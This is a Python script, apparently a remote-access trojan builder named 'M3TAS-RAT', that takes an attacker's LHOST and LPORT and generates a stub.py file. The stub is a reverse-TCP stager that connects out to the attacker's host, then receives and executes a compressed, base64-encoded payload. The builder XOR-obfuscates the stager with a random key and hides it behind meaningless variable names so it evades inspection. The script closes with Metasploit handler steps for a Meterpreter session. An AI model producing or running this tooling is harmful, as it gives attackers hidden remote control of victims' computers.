import random
from pathlib import Path
import platform
import os
import time
print("[*] Checking Requirements Module")
if platform.system().startswith("Linux"):
    try:
        import termcolor
    except ImportError:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python3 -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
    try:
        from pystyle import *
    except:
        os.system("python3 -m pip install pystyle -q -q -q")
        from pystyle import *
elif platform.system().startswith("Windows"):
    try:
        import termcolor
    except ImportError:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        from pystyle import *
    except:
        os.system("python -m pip install pystyle -q -q -q")
        from pystyle import *
    try:
        import colorama
        from colorama import Fore, Back, Style
    except ImportError:
        os.system("python -m pip install colorama -q -q -q")
        import colorama
        from colorama import Fore, Back, Style
colorama.deinit()
banner = Center.XCenter("""***********************************************************************
       ____  __ __________  _    ____        ____      _  _______       *
      / /  \/  |___ /_   _|/ \  / ___|      |  _ \    / \|_   _\ \`     *
     | || |\/| | |_ \ | | / _ \ \___ \ _____| |_) |  / _ \ | |  | |     *
    < < | |  | |___) || |/ ___ \ ___) |_____|  _ <  / ___ \| |   > >    *
     | ||_|  |_|____/ |_/_/   \_\____/      |_| \_\/_/   \_\_|  | |     *
      \_\                                                      /_/      *
                           Coded By: machine1337                        *
*************************************************************************
""")
def catc():
    try:
        if platform.system().startswith("Windows"):
            os.system('cls')
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            check()
        else:
            print("\033c")
            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
            check()
            print(termcolor.colored("[*] Please Use Linux Based OS!", 'red'))
    except KeyboardInterrupt:
        print()
        print(termcolor.colored("\nYou Pressed The Exit Button!", 'red'))
        quit()
def check():
    path_to_file = 'stub.py'
    path = Path(path_to_file)
    if path.is_file():
        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...', 'red'))
        print()
        print(termcolor.colored("""[1] For Remove File: Type:- del\n[2] For Rename File: Type:- ren """, 'yellow'))
        print()
        a = input(termcolor.colored("[+]Do U Want To Remove Old File Or Rename File:- ", 'blue'))
        print()
        if (a == "del" or a == "ren"):
            os.remove('stub.py')
            time.sleep(1)
            print(termcolor.colored("[*] File Successfully Deleted...", 'green'))
            print()
            enc()
        elif (a == "ren" or a == "mv"):
            os.rename('stub.py', 'old_stub.py')
            time.sleep(1)
            print(termcolor.colored("[*] File Successfully Renamed...", 'green'))
            print()
            enc()
        else:
            print(termcolor.colored("Plz! Remove or Rename It mannually", 'red'))
    else:
        enc()
def enc():
    file = input(termcolor.colored("\n[*]  Enter Your LHOST:- ", 'green'))
    file1 = input(termcolor.colored("\n[*] Enter Your LPORT:- ", 'cyan'))
    ac=f'''exec("""\\nimport socket,zlib,base64,struct,time\\nfor x in range(10):\\n     try:\\n         s=socket.socket(2,socket.SOCK_STREAM)\\n         s.connect(('{file}',{file1}))\\n         break\\n     except:\\n           time.sleep(5)\\nl=struct.unpack('>I',s.recv(4))[0]\\nd=s.recv(l)\\nwhile len(d)<l:\\n      d+=s.recv(l-len(d))\\nexec(zlib.decompress(base64.b64decode(d)),{{'s':s}})\\n""")'''
    string = ac
    a = 0
    key = ""
    while a < 100:
        key = key + str(random.randint(0, 9))
        a += 1

    no_of_itr = len(string)
    output_string = ""
    for i in range(no_of_itr):
        current_string = string[i]
        current_key = key[i % len(key)]
        output_string += chr(ord(current_string) ^ ord(current_key))
    c = repr(output_string)
    d = c.replace("'", "")
    try:
        with open('stub.py', 'w') as f:
            f.write(f"wopvEaTEcopFEavc =\"{d}\" \n")
            f.write(f"\niOpvEoeaaeavocp = \"{key}\"\n")
            f.write("uocpEAtacovpe = len(wopvEaTEcopFEavc)\noIoeaTEAcvpae = \"\"\nfor fapcEaocva in range(uocpEAtacovpe):\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n\n\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))")
            f.close()
        print(termcolor.colored('\n[ ✔ ] STUB FILE Generated ', 'green'))
        print(termcolor.colored("""
            *********************************************
                1. Start Metasploit-Frameowork
                2. use exploit multi/handler
                2. set payload python/meterpreter/reverse_tcp
                3. set LHOST       (your ip u set in start)
                4. set LPORT       (your port u set in start)
                5. exploit -j -z   
        """, 'cyan'))
    except FileNotFoundError:
        print(termcolor.colored("\n[ X ] Error Occured",'red'))
catc()
